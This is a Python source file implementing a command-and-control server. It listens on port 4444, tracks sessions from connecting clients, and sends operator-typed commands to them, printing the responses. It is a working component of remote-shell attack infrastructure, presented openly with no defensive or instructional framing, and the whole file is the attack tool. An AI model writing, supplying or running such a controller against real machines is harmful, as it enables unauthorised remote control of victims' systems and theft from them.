import socket
import threading
import os

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.sessions = {}
        self.session_id = 1
    
    def handle_client(self, client_socket, address):
        session_id = self.session_id
        self.sessions[session_id] = {
            'socket': client_socket,
            'address': address,
            'active': True
        }
        
        print(f"\\\\n[+] New session {session_id} from {address}")
        client_socket.send(b"Connected to C2 server\\\\n")
        
        try:
            while self.sessions[session_id]['active']:
                command = input(f"session_{session_id}> ")
                
                if command.lower() == 'exit':
                    break
                elif command.lower() == 'background':
                    break
                elif command.lower() == 'sessions':
                    self.list_sessions()
                    continue
                elif command.lower() == 'help':
                    self.show_help()
                    continue
                
                client_socket.send(command.encode())
                response = client_socket.recv(4096).decode()
                print(response)
                
        except Exception as e:
            print(f"Session {session_id} error: {e}")
        
        client_socket.close()
        if session_id in self.sessions:
            del self.sessions[session_id]
    
    def list_sessions(self):
        print("\\\\nActive Sessions:")
        for session_id, session in self.sessions.items():
            print(f"  {session_id}: {session['address']}")
    
    def show_help(self):
        print("\\\\nAvailable commands:")
        print("  sessions - List active sessions")
        print("  background - Background current session")
        print("  exit - Close current session")
        print("  help - Show this help")
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"C2 Server listening on {self.host}:{self.port}")
        print("Waiting for connections...")
        
        try:
            while True:
                client_socket, address = server.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address)
                )
                client_thread.daemon = True
                client_thread.start()
                self.session_id += 1
                
        except KeyboardInterrupt:
            print("\\\\nShutting down server...")
        finally:
            server.close()

if __name__ == "__main__":
    server = C2Server()
    server.start()
